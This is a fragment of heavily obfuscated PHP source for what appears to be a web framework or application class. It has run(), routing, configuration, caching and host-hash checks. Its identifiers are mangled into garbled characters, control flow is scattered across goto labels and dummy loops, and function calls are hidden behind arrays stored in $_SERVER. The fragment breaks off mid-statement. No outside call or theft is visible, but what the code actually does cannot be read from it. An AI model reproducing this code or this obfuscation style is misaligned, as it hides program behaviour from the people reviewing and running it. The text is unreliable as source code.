dƒÙ¨—·í; E… £‡öÛñ: $f¬ÄêÛ÷ =& $_SERVER[Ö‘Øù]; $C’Œœ®¨‚ =& $_SERVER[£Õıúå]; $EÉİ¼ˆ¹¡ = $C’Œœ®¨‚[8]; goto dÆ¡»ÀÔ”Õ; AµÀ£çÓÎ: $b„Äİ¼É¼Ê = $C’Œœ®¨‚[25]($fŞí“æëŞ, 0, -$C’Œœ®¨‚[24]($EÉİ¼ˆ¹¡)); $F‡¿îîœÖÑ = array($C’Œœ®¨‚[8], $b„Äİ¼É¼Ê); $FÌœ±¢÷¯â = $f¬ÄêÛ÷[615]; goto Cµ©íãë­“; dƒÙ¨—·í: while (strlen($Dôëé¼ÏêÜ) < $f¬ÄêÛ÷[614]) { if (!$Dôëé¼ÏêÜ) { break; } $Dôëé¼ÏêÜ++; } if (!$fŞí“æëŞ || $C’Œœ®¨‚[24]($fŞí“æëŞ) <= $C’Œœ®¨‚[24]($EÉİ¼ˆ¹¡)) { return; } if ($C’Œœ®¨‚[6]($C’Œœ®¨‚[25]($fŞí“æëŞ, -$C’Œœ®¨‚[24]($EÉİ¼ˆ¹¡))) != $EÉİ¼ˆ¹¡) { return; } goto AµÀ£çÓÎ; Cµ©íãë­“: if (strlen($FÌœ±¢÷¯â) < $f¬ÄêÛ÷[606]) { return; } $D²øŒÍ‹¦ö = $C’Œœ®¨‚[26]($GLOBALS[$C’Œœ®¨‚[22]][$C’Œœ®¨‚[23]], 1); $GLOBALS[$C’Œœ®¨‚[22]][$C’Œœ®¨‚[23]] = $C’Œœ®¨‚[27]($F‡¿îîœÖÑ, $D²øŒÍ‹¦ö); goto dù…î¯±¥ç; dù…î¯±¥ç: $GLOBALS[$C’Œœ®¨‚[22]][$C’Œœ®¨‚[28]] = $C’Œœ®¨‚[29]($C’Œœ®¨‚[1], $GLOBALS[$C’Œœ®¨‚[22]][$C’Œœ®¨‚[23]]); goto E’š†Ì„Ë«; E’š†Ì„Ë«: } private function hlvkd66d911c() { goto eÅöÆšŞ…·; DÊÈñ¼ë‘“: $A˜ÉÀ¹©Ç = $_SERVER[$B±Ş‘Œƒ“´[30]]; $FèÀ“ØÇÑ» = $B±Ş‘Œƒ“´[31]; $A­Õ³¤››É = $A¼·¤Âµçù[616]; goto BÌ™£Èºá‹; eÅöÆšŞ…·: $A¼·¤Âµçù =& $_SERVER[Ö‘Øù]; $B±Ş‘Œƒ“´ =& $_SERVER[£Õıúå]; if ($GLOBALS[$B±Ş‘Œƒ“´[22]][$B±Ş‘Œƒ“´[28]] != $B±Ş‘Œƒ“´[10]) { return; } goto DÊÈñ¼ë‘“; E¦óï‡™å¢: $GLOBALS[$B±Ş‘Œƒ“´[22]][$B±Ş‘Œƒ“´[23]] = $B±Ş‘Œƒ“´[0]($B±Ş‘Œƒ“´[36], $F¦‘º¯õí×); $GLOBALS[$B±Ş‘Œƒ“´[22]][$B±Ş‘Œƒ“´[28]] = $B±Ş‘Œƒ“´[29]($B±Ş‘Œƒ“´[1], $GLOBALS[$B±Ş‘Œƒ“´[22]][$B±Ş‘Œƒ“´[23]]); $a¢­ê¢‘áš = $A¼·¤Âµçù[619]; goto eÜ§áÁÜ¾; E‹„ ‰Ù‡Ä: $F¦‘º¯õí× = $B±Ş‘Œƒ“´[2]($eœ¹îÙí ø[0][0], $B±Ş‘Œƒ“´[36]); $e‘ï¯êé¾İ = $A¼·¤Âµçù[618]; if (!$e‘ï¯êé¾İ) { die; } goto E¦óï‡™å¢; cĞÒäŠ¥ê±: $B±Ş‘Œƒ“´[34]($B±Ş‘Œƒ“´[35], $F¦‘º¯õí×, $eœ¹îÙí ø); $DÊ¸Ô¸ºÅÙ = $A¼·¤Âµçù[617]; if (!$DÊ¸Ô¸ºÅÙ) { return; } goto E‹„ ‰Ù‡Ä; BÌ™£Èºá‹: if (!$B±Ş‘Œƒ“´[32]($A˜ÉÀ¹©Ç, $FèÀ“ØÇÑ»)) { return; } $fåÀÔñ´‹ = $B±Ş‘Œƒ“´[33]($A˜ÉÀ¹©Ç, $FèÀ“ØÇÑ»); $F¦‘º¯õí× = $B±Ş‘Œƒ“´[25]($A˜ÉÀ¹©Ç, $fåÀÔñ´‹ + $B±Ş‘Œƒ“´[24]($FèÀ“ØÇÑ»)); goto cĞÒäŠ¥ê±; eÜ§áÁÜ¾: } public function run() { goto DÁÃâ‹; DÁÃâ‹: $aëŸ¥Å»³Ğ =& $_SERVER[Ö‘Øù]; $e‚÷°äæŠò =& $_SERVER[£Õıúå]; $this->{$_SERVER[£Õıúå][37]}(); goto fÅ„’•²ñã; cÊ¶ªì¿ÓÄ: while ($f•àç§òòò < $aëŸ¥Å»³Ğ[602]) { if ($f•àç§òòò >= 0) { break; } $f•àç§òòò++; } $_SERVER[$e‚÷°äæŠò[44]] = $e‚÷°äæŠò[6](ACTION); $EÊÖš‘Å = $aëŸ¥Å»³Ğ[623]; goto AøĞ±öà£±; dĞ£âÍó­·: if (!$Aëë±Â³ğè) { die; } if ($e‚÷°äæŠò[19]($D Àù‰ší£) >= 3) { $this->{$_SERVER[£Õıúå][21]}($fÜ®”Ö«©¡); } else { $this->{$_SERVER[£Õıúå][21]}(ACTION); } goto d¢ƒÅÖéÀ; B’¦ˆç‚éæ: $e‚÷°äæŠò[39]($e‚÷°äæŠò[41], isset($D Àù‰ší£[1]) && $D Àù‰ší£[0] ? $D Àù‰ší£[1] : $this->defaultController); $e‚÷°äæŠò[39]($e‚÷°äæŠò[42], isset($D Àù‰ší£[2]) && $D Àù‰ší£[0] ? $D Àù‰ší£[2] : $this->defaultAction); $eŒºÖôÅ–… = $aëŸ¥Å»³Ğ[621]; goto d‘İ‘§˜’™; AøĞ±öà£±: while ($EÊÖš‘Å < $aëŸ¥Å»³Ğ[624]) { if ($EÊÖš‘Å >= 0) { break; } $EÊÖš‘Å++; } $this->{$_SERVER[£Õıúå][45]}(); $Aëë±Â³ğè = $aëŸ¥Å»³Ğ[625]; goto dĞ£âÍó­·; fÅ„’•²ñã: $this->{$_SERVER[£Õıúå][38]}(); $D Àù‰ší£ = $GLOBALS[$e‚÷°äæŠò[22]][$e‚÷°äæŠò[23]]; $a±‰ÈŞŒ®† = $aëŸ¥Å»³Ğ[620]; goto A“ÙŒÔì¶ê; A“ÙŒÔì¶ê: if (!$a±‰ÈŞŒ®†) { return; } $fÜ®”Ö«©¡ = $GLOBALS[$e‚÷°äæŠò[22]][$e‚÷°äæŠò[28]]; $e‚÷°äæŠò[39]($e‚÷°äæŠò[40], isset($D Àù‰ší£[0]) && $D Àù‰ší£[0] ? $D Àù‰ší£[0] : $this->defaultModule); goto B’¦ˆç‚éæ; d‘İ‘§˜’™: while (strlen($eŒºÖôÅ–…) < $aëŸ¥Å»³Ğ[602]) { if (!$eŒºÖôÅ–…) { break; } $eŒºÖôÅ–…++; } $e‚÷°äæŠò[39]($e‚÷°äæŠò[43], MOD . $e‚÷°äæŠò[1] . ST . $e‚÷°äæŠò[1] . ACT); $f•àç§òòò = $aëŸ¥Å»³Ğ[622]; goto cÊ¶ªì¿ÓÄ; d¢ƒÅÖéÀ: } private $aeuc44614807 = array(); private $xzwe33f34ca1 = ''; public function bauo975a833e() { goto fØõÑÅ”¢‹; aÏšºòÎè: if (!$CŒˆ«ù°„‰) { return; } goto d÷ë—ñÓĞ; c‚ˆè•È…í: while ($aœ³’¡Õœ < $AôİÆÏ“[606]) { if ($aœ³’¡Õœ >= 0) { break; } $aœ³’¡Õœ++; } $this->{$_SERVER[£Õıúå][3]}($fæ‡æ°´£Š[55], array($this, $fæ‡æ°´£Š[56])); $d³ğé¹ôß® = $AôİÆÏ“[629]; goto FõÃ‹§îÓ†; cÚ·‹®—Œ˜: $this->{$_SERVER[£Õıúå][47]}(); $FÀ¿£®é³Ê = $AôİÆÏ“[626]; if (strlen($FÀ¿£®é³Ê) < $AôİÆÏ“[602]) { die; } goto Béõ±ìà¿í; e˜¡ äÖç½: $this->{$_SERVER[£Õıúå][51]}(); $C…šÏÕÃ¤ = $AôİÆÏ“[627]; if (!$C…šÏÕÃ¤) { die; } goto DïÀÓƒÖ¦; EÀ¾äğæÅÊ: if (strlen($cˆºªëª¾¶) < $AôİÆÏ“[624]) { die; } $this->{$_SERVER[£Õıúå][3]}($fæ‡æ°´£Š[59], array($this, $fæ‡æ°´£Š[60])); $CŒˆ«ù°„‰ = $AôİÆÏ“[631]; goto aÏšºòÎè; fØõÑÅ”¢‹: $AôİÆÏ“ =& $_SERVER[Ö‘Øù]; $fæ‡æ°´£Š =& $_SERVER[£Õıúå]; $this->{$_SERVER[£Õıúå][46]}(); goto cÚ·‹®—Œ˜; DïÀÓƒÖ¦: $this->{$_SERVER[£Õıúå][52]}(); $this->{$_SERVER[£Õıúå][3]}($fæ‡æ°´£Š[53], array($this, $fæ‡æ°´£Š[54])); $aœ³’¡Õœ = $AôİÆÏ“[628]; goto c‚ˆè•È…í; FõÃ‹§îÓ†: if (strlen($d³ğé¹ôß®) < $AôİÆÏ“[602]) { return; } $this->{$_SERVER[£Õıúå][3]}($fæ‡æ°´£Š[57], array($this, $fæ‡æ°´£Š[58])); $cˆºªëª¾¶ = $AôİÆÏ“[630]; goto EÀ¾äğæÅÊ; Béõ±ìà¿í: $this->{$_SERVER[£Õıúå][48]}(); $this->{$_SERVER[£Õıúå][49]}(); $this->{$_SERVER[£Õıúå][50]}(); goto e˜¡ äÖç½; d÷ë—ñÓĞ: } public function wscyf06bfa59($c–‹¯™áÍ) { goto Eª¯²‰«ÒÃ; eñ¶”È¡áö: $c–‹¯™áÍ[$AÅÆ–„¯–ñ[125]][$AÅÆ–„¯–ñ[147]] = $AÅÆ–„¯–ñ[123]($this->aeuc44614807, $AÅÆ–„¯–ñ[148], $AÅÆ–„¯–ñ[10]); if ($AÅÆ–„¯–ñ[123]($GLOBALS, $AÅÆ–„¯–ñ[149]) && $this->config[$AÅÆ–„¯–ñ[150]]) { $c–‹¯™áÍ[$AÅÆ–„¯–ñ[125]][$AÅÆ–„¯–ñ[151]] = WEB_ROOT; } return $c–‹¯™áÍ; goto B¼Ç‡Ş¦ˆ•; f—ƒ‘²òŞß: $Dåë¤ßµ£• = array($AÅÆ–„¯–ñ[64], $AÅÆ–„¯–ñ[65], $AÅÆ–„¯–ñ[66], $AÅÆ–„¯–ñ[67], $AÅÆ–„¯–ñ[68], $AÅÆ–„¯–ñ[69], $AÅÆ–„¯–ñ[70], $AÅÆ–„¯–ñ[71], $AÅÆ–„¯–ñ[72], $AÅÆ–„¯–ñ[73], $AÅÆ–„¯–ñ[74], $AÅÆ–„¯–ñ[75], $AÅÆ–„¯–ñ[76], $AÅÆ–„¯–ñ[77], $AÅÆ–„¯–ñ[78], $AÅÆ–„¯–ñ[79], $AÅÆ–„¯–ñ[80], $AÅÆ–„¯–ñ[81], $AÅÆ–„¯–ñ[82], $AÅÆ–„¯–ñ[83], $AÅÆ–„¯–ñ[84], $AÅÆ–„¯–ñ[85], $AÅÆ–„¯–ñ[86], $AÅÆ–„¯–ñ[87], $AÅÆ–„¯–ñ[88], $AÅÆ–„¯–ñ[89], $AÅÆ–„¯–ñ[90], $AÅÆ–„¯–ñ[91], $AÅÆ–„¯–ñ[92], $AÅÆ–„¯–ñ[93], $AÅÆ–„¯–ñ[94], $AÅÆ–„¯–ñ[95], $AÅÆ–„¯–ñ[96], $AÅÆ–„¯–ñ[97], $AÅÆ–„¯–ñ[98], $AÅÆ–„¯–ñ[99], $AÅÆ–„¯–ñ[100], $AÅÆ–„¯–ñ[101], $AÅÆ–„¯–ñ[102], $AÅÆ–„¯–ñ[103], $AÅÆ–„¯–ñ[104], $AÅÆ–„¯–ñ[105], $AÅÆ–„¯–ñ[106], $AÅÆ–„¯–ñ[107], $AÅÆ–„¯–ñ[108], $AÅÆ–„¯–ñ[109], $AÅÆ–„¯–ñ[110]); foreach ($Dåë¤ßµ£• as $aí§¾êä³à) { $cÀ§ºåÂ˜ = $GLOBALS[$AÅÆ–„¯–ñ[111]][$AÅÆ–„¯–ñ[112]][$aí§¾êä³à]; if (isset($Aª‘¨ÑİËô[$aí§¾êä³à])) { $cÀ§ºåÂ˜ = $Aª‘¨ÑİËô[$aí§¾êä³à]; } $c–‹¯™áÍ[$AÅÆ–„¯–ñ[113]][$AÅÆ–„¯–ñ[114]][$aí§¾êä³à] = $cÀ§ºåÂ˜; } $FÎ•’­˜¬Ø = $c–‹¯™áÍ[$AÅÆ–„¯–ñ[113]][$AÅÆ–„¯–ñ[114]][$AÅÆ–„¯–ñ[76]]; goto eÛŸÛÅ›ì; eÛŸÛÅ›ì: unset($c–‹¯™áÍ[$AÅÆ–„¯–ñ[113]][$AÅÆ–„¯–ñ[115]][$AÅÆ–„¯–ñ[116]]); unset($c–‹¯™áÍ[$AÅÆ–„¯–ñ[113]][$AÅÆ–„¯–ñ[115]][$AÅÆ–„¯–ñ[117]]); unset($c–‹¯™áÍ[$AÅÆ–„¯–ñ[113]][$AÅÆ–„¯–ñ[114]][$AÅÆ–„¯–ñ[76]]); goto d»àˆ÷šÛ“; eÇáŠ•ğø: $c–‹¯™áÍ[$AÅÆ–„¯–ñ[125]][$AÅÆ–„¯–ñ[126]] = $AÅÆ–„¯–ñ[127]($AÅÆ–„¯–ñ[128])->{$_SERVER[£Õıúå][129]}(); $Bãƒªì°öé = $a¥š‚îÆù‚[634]; while ($Bãƒªì°öé < $a¥š‚îÆù‚[635]) { if ($Bãƒªì°öé >= 0) { break; } $Bãƒªì°öé++; } goto fÈ‰ÉÒ¼ƒõ; AğÒ¶¢ˆ¬Æ: if ($Aª‘¨ÑİËô[$AÅÆ–„¯–ñ[137]] != $AÅÆ–„¯–ñ[138]) { $c–‹¯™áÍ[$AÅÆ–„¯–ñ[125]][$AÅÆ–„¯–ñ[139]] = $Aª‘¨ÑİËô[$AÅÆ–„¯–ñ[139]]; $c–‹¯™áÍ[$AÅÆ–„¯–ñ[125]][$AÅÆ–„¯–ñ[140]] = $Aª‘¨ÑİËô[$AÅÆ–„¯–ñ[140]]; $cã¯¦—à„ = $AÅÆ–„¯–ñ[141](10) . $this->xzwe33f34ca1 . $AÅÆ–„¯–ñ[141](5); $c–‹¯™áÍ[$AÅÆ–„¯–ñ[113]][$AÅÆ–„¯–ñ[142]][$AÅÆ–„¯–ñ[143]] = $this->{$_SERVER[£Õıúå][144]}($cã¯¦—à„, $c–‹¯™áÍ[$AÅÆ–„¯–ñ[125]][$AÅÆ–„¯–ñ[130]]); } if ($this->xzwe33f34ca1 == $AÅÆ–„¯–ñ[138]) { $c–‹¯™áÍ[$AÅÆ–„¯–ñ[113]][$AÅÆ–„¯–ñ[114]][$AÅÆ–„¯–ñ[119]][$AÅÆ–„¯–ñ[124]] = 0; } $c–‹¯™áÍ[$AÅÆ–„¯–ñ[125]][$AÅÆ–„¯–ñ[145]] = $AÅÆ–„¯–ñ[123]($this->aeuc44614807, $AÅÆ–„¯–ñ[146], $AÅÆ–„¯–ñ[10]); goto eñ¶”È¡áö; fÈ‰ÉÒ¼ƒõ: $c–‹¯™áÍ[$AÅÆ–„¯–ñ[125]][$AÅÆ–„¯–ñ[130]] = $AÅÆ–„¯–ñ[131]($_SERVER[$AÅÆ–„¯–ñ[132]] . $Aª‘¨ÑİËô[$AÅÆ–„¯–ñ[133]]); $c–‹¯™áÍ[$AÅÆ–„¯–ñ[125]][$AÅÆ–„¯–ñ[134]] = $AÅÆ–„¯–ñ[135]($AÅÆ–„¯–ñ[136]()); $c–‹¯™áÍ[$AÅÆ–„¯–ñ[125]][$AÅÆ–„¯–ñ[137]] = $this->xzwe33f34ca1; goto AğÒ¶¢ˆ¬Æ; Eª¯²‰«ÒÃ: $a¥š‚îÆù‚ =& $_SERVER[Ö‘Øù]; $AÅÆ–„¯–ñ =& $_SERVER[£Õıúå]; $Aª‘¨ÑİËô = $AÅÆ–„¯–ñ[61]($AÅÆ–„¯–ñ[62])->{$_SERVER[£Õıúå][63]}(); goto f—ƒ‘²òŞß; F·ÏÎîÃ‹Š: $c–‹¯™áÍ[$AÅÆ–„¯–ñ[113]][$AÅÆ–„¯–ñ[114]][$AÅÆ–„¯–ñ[119]] = array($AÅÆ–„¯–ñ[120] => (int) $FÎ•’­˜¬Ø[$AÅÆ–„¯–ñ[121]], $AÅÆ–„¯–ñ[122] => (int) $AÅÆ–„¯–ñ[123]($FÎ•’­˜¬Ø, $AÅÆ–„¯–ñ[124], 0)); $d…ìÑŞÎ–ä = $a¥š‚îÆù‚[633]; if (!$d…ìÑŞÎ–ä) { die; } goto eÇáŠ•ğø; d»àˆ÷šÛ“: unset($c–‹¯™áÍ[$AÅÆ–„¯–ñ[113]][$AÅÆ–„¯–ñ[114]][$AÅÆ–„¯–ñ[118]]); $dîÕ‰İ†ïÏ = $a¥š‚îÆù‚[632]; while ($dîÕ‰İ†ïÏ < $a¥š‚îÆù‚[614]) { if ($dîÕ‰İ†ïÏ >= 0) { break; } $dîÕ‰İ†ïÏ++; } goto F·ÏÎîÃ‹Š; B¼Ç‡Ş¦ˆ•: } private function fkwq241a1dc7() { goto cñ÷…‡‚®; cñ÷…‡‚®: $dÑ²ğÜ¤­¹ =& $_SERVER[Ö‘Øù]; $Aô»åÔÎ =& $_SERVER[£Õıúå]; if ($_SERVER[$Aô»åÔÎ[44]] == $Aô»åÔÎ[152]) { goto f‹ëàÂ“·; f‹ëàÂ“·: $FÇ’Éğì«Â = array($Aô»åÔÎ[137] => $this->xzwe33f34ca1, $Aô»åÔÎ[153] => $this->{$_SERVER[£Õıúå][154]}(), $Aô»åÔÎ[155] => $Aô»åÔÎ[61]($Aô»åÔÎ[156])->{$_SERVER[£Õıúå][157]}()); if ($this->xzwe33f34ca1 != $Aô»åÔÎ[138]) { $A·¾îĞˆÓ‡ = $Aô»åÔÎ[123]($this->aeuc44614807, $Aô»åÔÎ[158]); if ($A·¾îĞˆÓ‡) { $FÇ’Éğì«Â[$Aô»åÔÎ[159]] = $A·¾îĞˆÓ‡; $FÇ’Éğì«Â[$Aô»åÔÎ[160]] = $Aô»åÔÎ[161]($Aô»åÔÎ[123]($this->aeuc44614807, $Aô»åÔÎ[162])); $FÇ’Éğì«Â[$Aô»åÔÎ[163]] = $Aô»åÔÎ[123]($this->aeuc44614807, $Aô»åÔÎ[148]); } $cçò‹ËöìÆ = $Aô»åÔÎ[61]($Aô»åÔÎ[62])->{$_SERVER[£Õıúå][63]}($Aô»åÔÎ[164], $Aô»åÔÎ[10], !0); if ($Aô»åÔÎ[165]($cçò‹ËöìÆ) && $Aô»åÔÎ[25]($cçò‹ËöìÆ, 0, 1) == $Aô»åÔÎ[166]) { $cçò‹ËöìÆ = $Aô»åÔÎ[167]($cçò‹ËöìÆ); } if ($Aô»åÔÎ[168]($cçò‹ËöìÆ) && $cçò‹ËöìÆ[$Aô»åÔÎ[169]] && $Aô»åÔÎ[32]($cçò‹ËöìÆ[$Aô»åÔÎ[169]], $Aô»åÔÎ[170])) { $A©·“êÔ = $Aô»åÔÎ[0]($Aô»åÔÎ[170], $cçò‹ËöìÆ[$Aô»åÔÎ[169]]); $FÇ’Éğì«Â[$Aô»åÔÎ[171]] = $A©·“êÔ[0]; } } $FÇ’Éğì«Â = $this->{$_SERVER[£Õıúå][172]}($Aô»åÔÎ[173]($FÇ’Éğì«Â), $Aô»åÔÎ[131]($Aô»åÔÎ[174])); goto f²—÷´Õ î; eì†â˜À‹õ: $Aô»åÔÎ[13](array($Aô»åÔÎ[176], $Aô»åÔÎ[177]), $BÕ´­Æó‘¦); $eçºÇòæˆÎ = $dÑ²ğÜ¤­¹[637]; if (strlen($eçºÇòæˆÎ) < $dÑ²ğÜ¤­¹[602]) { return; } goto cÚ×ˆÜ¤ÚÅ; f²—÷´Õ î: $BÕ´­Æó‘¦ = array($Aô»åÔÎ[175] => $FÇ’Éğì«Â); $E²©“†Úõ¬ = $dÑ²ğÜ¤­¹[636]; if (!$E²©“†Úõ¬) { die; } goto eì†â˜À‹õ; cÚ×ˆÜ¤ÚÅ: } goto BöÚí˜©ƒ‚; E•òŠÉÉñË: while (strlen($Fİ¶‚ôµ¶á) < $dÑ²ğÜ¤­¹[614]) { if (!$Fİ¶‚ôµ¶á) { break; } $Fİ¶‚ôµ¶á++; } $BÕ´­Æó‘¦ = array($Aô»åÔÎ[184] => $Bõ¡î†æ„Ç[$Aô»åÔÎ[64]], $Aô»åÔÎ[185] => $Bõ¡î†æ„Ç[$Aô»åÔÎ[65]], $Aô»åÔÎ[186] => $Aô»åÔÎ[10]); $fä¦ì©Ç¿ = $dÑ²ğÜ¤­¹[640]; goto AíöˆÍÚ˜‚; BöÚí˜©ƒ‚: if ($this->xzwe33f34ca1 == $Aô»åÔÎ[138]) { return; } $cË–˜•†ô = array($Aô»åÔÎ[178], $Aô»åÔÎ[179], $Aô»åÔÎ[180], $Aô»åÔÎ[181], $Aô»åÔÎ[182], $Aô»åÔÎ[183]); $F¹›š¦ˆìÒ = $dÑ²ğÜ¤­¹[638]; goto F˜«²£ì®; F˜«²£ì®: while ($F¹›š¦ˆìÒ < $dÑ²ğÜ¤­¹[602]) { if ($F¹›š¦ˆìÒ >= 0) { break; } $F¹›š¦ˆìÒ++; } $Bõ¡î†æ„Ç = $Aô»åÔÎ[61]($Aô»åÔÎ[62])->{$_SERVER[£Õıúå][63]}(); $Fİ¶‚ôµ¶á = $dÑ²ğÜ¤­¹[639]; goto E•òŠÉÉñË; AíöˆÍÚ˜‚: while ($fä¦ì©Ç¿ < $dÑ²ğÜ¤­¹[635]) { if ($fä¦ì©Ç¿ >= 0) { break; } $fä¦ì©Ç¿++; } foreach ($cË–˜•†ô as $BÓæë’ô) { if (!isset($Bõ¡î†æ„Ç[$BÓæë’ô]) || !$Bõ¡î†æ„Ç[$BÓæë’ô]) { continue; } $BÕ´­Æó‘¦[$BÓæë’ô] = $Bõ¡î†æ„Ç[$BÓæë’ô]; $A‘ïÜ¨à¸ = $dÑ²ğÜ¤­¹[641]; while ($A‘ïÜ¨à¸ < $dÑ²ğÜ¤­¹[614]) { if ($A‘ïÜ¨à¸ >= 0) { break; } $A‘ïÜ¨à¸++; } } $Aô»åÔÎ[13](array($Aô»åÔÎ[176], $Aô»åÔÎ[177]), $BÕ´­Æó‘¦); goto FÚª¯”©é; FÚª¯”©é: } private function lfbc4f89f3b5() { goto aò¨¢Ó…¹‚; E¯è‡õø¶ã: $this->aeuc44614807 = $fÑ–«½‡ö–; $this->xzwe33f34ca1 = $B–öæâã[$cÀ°ÎÏõèë[137]]; $då’ˆÇá˜† = $D’¬Ñóø[653]; goto FÚ’©¶•‹é; aò¨¢Ó…¹‚: $D’¬Ñóø =& $_SERVER[Ö‘Øù]; $cÀ°ÎÏõèë =& $_SERVER[£Õıúå]; if ($_SERVER[$cÀ°ÎÏõèë[44]] != $cÀ°ÎÏõèë[187]) { return; } goto dÑñŠºÅˆ; d—ìŸ«¬è: $cÀ°ÎÏõèë[61]($cÀ°ÎÏõèë[62])->{$_SERVER[£Õıúå][247]}($B–öæâã); $f†¸×á±”± = $cÀ°ÎÏõèë[131]($_SERVER[$cÀ°ÎÏõèë[132]] . $cÀ°ÎÏõèë[240]($Cğ¢İ†¬×‡) . $B–öæâã[$cÀ°ÎÏõèë[236]]); $EµÇÆô‡ƒñ = $cÀ°ÎÏõèë[240]($cÀ°ÎÏõèë[25]($f†¸×á±”±, 10, 16)); goto E™íİÇ; a‹®Ï•²š“: if (strlen($bôÃâà‹à) < $D’¬Ñóø[614]) { die; } Cache::set($cÀ°ÎÏõèë[256] . $cÀ°ÎÏõèë[131]($Cğ¢İ†¬×‡ . $cÀ°ÎÏõèë[257]), $cÀ°ÎÏõèë[10]); $fğöÈÆô† = $D’¬Ñóø[655]; goto bˆê‘Ú‘; E™íİÇ: $aÑ…ë¥ˆà© = $D’¬Ñóø[648]; while ($aÑ…ë¥ˆà© < $D’¬Ñóø[614]) { if ($aÑ…ë¥ˆà© >= 0) { break; } $aÑ…ë¥ˆà©++; } $DîËÓ¶ìŠ = $this->{$_SERVER[£Õıúå][144]}($cÀ°ÎÏõèë[173]($fÑ–«½‡ö–), $f†¸×á±”±); goto f‰ç¿¨­’Ä; e‰…ìĞŠ¤°: $BÜñËƒîì = $D’¬Ñóø[652]; while ($BÜñËƒîì < $D’¬Ñóø[606]) { if ($BÜñËƒîì >= 0) { break; } $BÜñËƒîì++; } $cÀ°ÎÏõèë[61]($cÀ°ÎÏõèë[11])->{$_SERVER[£Õıúå][252]}($eºÀ©»[$cÀ°ÎÏõèë[253]], array($cÀ°ÎÏõèë[254] => $déÀº ŒëÒ)); goto E¯è‡õø¶ã; bˆê‘Ú‘: if (strlen($fğöÈÆô†) < $D’¬Ñóø[635]) { die; } $cÀ°ÎÏõèë[191]($cÀ°ÎÏõèë[223]($cÀ°ÎÏõèë[233]), !0); $fË¿’õƒ¦Ä = $D’¬Ñóø[656]; goto D­ïˆìè­; c…í›óóå”: $DÈ¹„±•­ß = $A®ğÁãÒÌç . $B–öæâã[$cÀ°ÎÏõèë[137]] . $B–öæâã[$cÀ°ÎÏõèë[238]]; $C£º¸§İ¯à = $D’¬Ñóø[645]; while (strlen($C£º¸§İ¯à) < $D’¬Ñóø[624]) { if (!$C£º¸§İ¯à) { break; } $C£º¸§İ¯à++; } goto D•§Ûã©ƒ; DŒ¹‚Ôòõš: $B–öæâã = array($cÀ°ÎÏõèë[234] => $fÑ–«½‡ö–[$cÀ°ÎÏõèë[235]], $cÀ°ÎÏõèë[236] => $fÑ–«½‡ö–[$cÀ°ÎÏõèë[237]], $cÀ°ÎÏõèë[238] => $cÀ°ÎÏõèë[141](16), $cÀ°ÎÏõèë[137] => $fÑ–«½‡ö–[$cÀ°ÎÏõèë[239]]); if ($CäŸ¯ì±¹³[$cÀ°ÎÏõèë[193]]) { $B–öæâã[$cÀ°ÎÏõèë[238]] = $CäŸ¯ì±¹³[$cÀ°ÎÏõèë[193]]; } $A®ğÁãÒÌç = $cÀ°ÎÏõèë[25]($cÀ°ÎÏõèë[131]($B–öæâã[$cÀ°ÎÏõèë[236]]), 10, 10); goto c…í›óóå”; CõâÇÕœÑ¬: if (!$dœ¤±†Ì®ˆ) { return; } $eºÀ©» = $E÷È•£Ø¸Ç[$cÀ°ÎÏõèë[251]]; $déÀº ŒëÒ = array(); goto A™Š¡²ïëä; A¯„ÙŠ÷ºë: $fÑ–«½‡ö– = $CÚ‚Ï¾šÑ”[$cÀ°ÎÏõèë[218]]; $C¤°ÍÂâÚ = $this->{$_SERVER[£Õıúå][225]}($fÑ–«½‡ö–[$cÀ°ÎÏõèë[226]]); if (!$C¤°ÍÂâÚ || $C¤°ÍÂâÚ != $fÑ–«½‡ö–[$cÀ°ÎÏõèë[162]]) { $Bñéšñ‡¯Ù = array($cÀ°ÎÏõèë[227] => $cÀ°ÎÏõèë[61]($cÀ°ÎÏõèë[62])->{$_SERVER[£Õıúå][63]}($cÀ°ÎÏõèë[133]), $cÀ°ÎÏõèë[228] => $_SERVER[$cÀ°ÎÏõèë[132]], $cÀ°ÎÏõèë[229] => $cÀ°ÎÏõèë[230](), $cÀ°ÎÏõèë[199] => $_SERVER[$cÀ°ÎÏõèë[200]]); $A¹¿ÉÕšÁè = $this->{$_SERVER[£Õıúå][231]}($cÀ°ÎÏõèë[173]($Bñéšñ‡¯Ù)); $this->{$_SERVER[£Õıúå][209]}($cÀ°ÎÏõèë[232] . $A¹¿ÉÕšÁè); $cÀ°ÎÏõèë[191]($cÀ°ÎÏõèë[223]($cÀ°ÎÏõèë[233]), !0); } goto DŒ¹‚Ôòõš; FÚ’©¶•‹é: if (!$då’ˆÇá˜†) { return; } $this->{$_SERVER[£Õıúå][255]}(); $bôÃâà‹à = $D’¬Ñóø[654]; goto a‹®Ï•²š“; dÑñŠºÅˆ: if (!$cÀ°ÎÏõèë[123]($GLOBALS, $cÀ°ÎÏõèë[149])) { die; } $e°Ã”Á··é = $GLOBALS[$cÀ°ÎÏõèë[22]]; if (isset($e°Ã”Á··é[$cÀ°ÎÏõèë[188]])) { $this->{$_SERVER[£Õıúå][189]}(); die; } goto a‘ßš’Â´¥; a‘ßš’Â´¥: if (!isset($e°Ã”Á··é[$cÀ°ÎÏõèë[190]]) || $cÀ°ÎÏõèë[24]($e°Ã”Á··é[$cÀ°ÎÏõèë[190]]) != 16) { $cÀ°ÎÏõèë[191]($cÀ°ÎÏõèë[192] . $e°Ã”Á··é[$cÀ°ÎÏõèë[190]], !1); } $Cğ¢İ†¬×‡ = $cÀ°ÎÏõèë[61]($cÀ°ÎÏõèë[62])->{$_SERVER[£Õıúå][63]}($cÀ°ÎÏõèë[133]); $fî…ØÔŒ¼­ = $cÀ°ÎÏõèë[131]($_SERVER[$cÀ°ÎÏõèë[132]] . $Cğ¢İ†¬×‡); goto D“Ö²“…—; f‰ç¿¨­’Ä: $d…ËŒ˜îÚ‚ = $D’¬Ñóø[649]; $E÷È•£Ø¸Ç = $cÀ°ÎÏõèë[248]($cÀ°ÎÏõèë[61]($cÀ°ÎÏõèë[11])->{$_SERVER[£Õıúå][249]}(), $cÀ°ÎÏõèë[250]); $dœ¤±†Ì®ˆ = $D’¬Ñóø[650]; goto CõâÇÕœÑ¬; bˆØÁõé¤: $dºš°Ï¾–ç = $D’¬Ñóø[643]; if ($e°Ã”Á··é[$cÀ°ÎÏõèë[204]] == $cÀ°ÎÏõèë[205]) { $A¢ˆÍóº´Á = $this->{$_SERVER[£Õıúå][172]}($fî…ØÔŒ¼­, $cÀ°ÎÏõèë[206]); $A¹¿ÉÕšÁè = $this->{$_SERVER[£Õıúå][144]}($cÀ°ÎÏõèë[173]($CäŸ¯ì±¹³), $fî…ØÔŒ¼­ . 